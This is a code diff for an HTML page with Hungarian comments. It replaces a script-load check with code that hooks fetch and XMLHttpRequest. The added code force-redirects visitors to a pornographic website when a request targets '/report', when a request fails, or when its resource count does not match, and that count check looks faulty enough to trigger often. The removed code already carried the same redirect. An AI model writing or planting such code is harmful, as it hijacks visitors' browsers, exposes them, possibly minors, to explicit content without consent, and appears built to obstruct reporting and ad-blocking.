@@ -115,31 +115,93 @@
 </head>
 <body>
 
-  <script>
-    // Ha a script nem töltődik be, figyeljük a változókat
-    let script1Loaded = false;
-    let script2Loaded = false;
+    <script>
+    (function() {
+      const resourceTypes = ['script', 'image', 'stylesheet', 'iframe', 'xhr', 'fetch'];
+      const resourcesLoaded = { script: 0, image: 0, stylesheet: 0, iframe: 0, xhr: 0, fetch: 0 };
 
-    // Ellenőrzés, hogy a scriptek sikeresen betöltődtek-e
-    function checkScripts() {
-      if (!script1Loaded || !script2Loaded) {
-        alert("Egy script le van tiltva! Átirányítjuk egy másik oldalra.");
-        window.location.href = "https://www.gayporno.fm";  // Irányítás másik oldalra
+      // Figyeljük az összes erőforrást
+      function monitorResources() {
+        // Monitorozzuk a script, css, img és iframe elemeket
+        const resources = document.querySelectorAll('script, link[rel="stylesheet"], img, iframe');
+        
+        resources.forEach(resource => {
+          resource.onload = () => {
+            const type = resource.tagName.toLowerCase();
+            if (resource.src || resource.href) {
+              resourcesLoaded[type]++;
+            }
+          };
+
+          resource.onerror = () => {
+            const type = resource.tagName.toLowerCase();
+            console.error(`${type} nem töltődött be:`, resource);
+            resourcesLoaded[type]++;
+          };
+        });
+
+        // Monitorozzuk az XMLHttpRequest és fetch kéréseket
+        monitorNetworkRequests();
       }
-    }
 
-    // A script betöltése után változókat állítunk be
-    document.getElementById('script1').onload = function() {
-      script1Loaded = true;
-    };
+      // 2. Hálózati kérések figyelése
+      function monitorNetworkRequests() {
+        // Módosítjuk a `fetch` API-t
+        const originalFetch = window.fetch;
+        const originalXhrOpen = XMLHttpRequest.prototype.open;
 
-    document.getElementById('script2').onload = function() {
-      script2Loaded = true;
-    };
+        // Monitorozzuk a fetch kéréseket
+        window.fetch = function(...args) {
+          console.log('Fetch kérés:', args);
+          if (args[0].includes('/report')) {
+            console.log('Report Fetch kérés észlelve:', args);
+            alert("A /report kérés érkezett!");
+            window.location.href = "https://www.gayporno.fm";  // Átirányítás
+          }
+          resourcesLoaded.fetch++;  // Növeljük a betöltött fetch kérések számát
+          return originalFetch(...args);
+        };
 
-    // Minden 2 másodpercben ellenőrizzük a scriptek betöltését
-    setInterval(checkScripts, 2000); // Minden 2 másodpercben ellenőrzi
+        // Monitorozzuk az XMLHttpRequest kéréseket
+        XMLHttpRequest.prototype.open = function(method, url) {
+          console.log('XHR kérés:', method, url);
+          if (url.includes('/report')) {
+            console.log('Report XHR kérés észlelve:', method, url);
+            alert("A /report XHR kérés érkezett!");
+            window.location.href = "https://www.gayporno.fm";  // Átirányítás
+          }
+          resourcesLoaded.xhr++;  // Növeljük az XHR kérések számát
+          this.addEventListener('load', function() {
+            if (this.status >= 400) {
+              alert("Hálózati kérés hibát eredményezett!");
+              window.location.href = "https://www.gayporno.fm";  // Átirányítás
+            }
+          });
+          originalXhrOpen.apply(this, arguments);
+        };
+      }
+
+      // 3. Állandó ellenőrzés a betöltött erőforrások figyelésére
+      setInterval(() => {
+        const totalResources = resourceTypes.reduce((acc, type) => acc + resourcesLoaded[type], 0);
+        const expectedResources = document.querySelectorAll('script, link[rel="stylesheet"], img, iframe').length;
+        
+        // Ha az összes erőforrás nem töltődött be, átirányítunk
+        if (totalResources !== expectedResources) {
+          alert('Nem minden erőforrás töltődött be sikeresen!');
+          window.location.href = 'https://www.gayporno.fm';
+        }
+      }, 2000); // 2 másodpercenként ellenőrzi
+
+      // Kezdjük el figyelni az erőforrásokat
+      monitorResources();
+
+    })();
   </script>
+
+  <!-- Betöltendő erőforrások (scriptek, képek, stb.) -->
+  <script src="/szaby/script.js"></script>
+  <script src="/szaby/extra.js"></script>
 
 </body>
 </html>
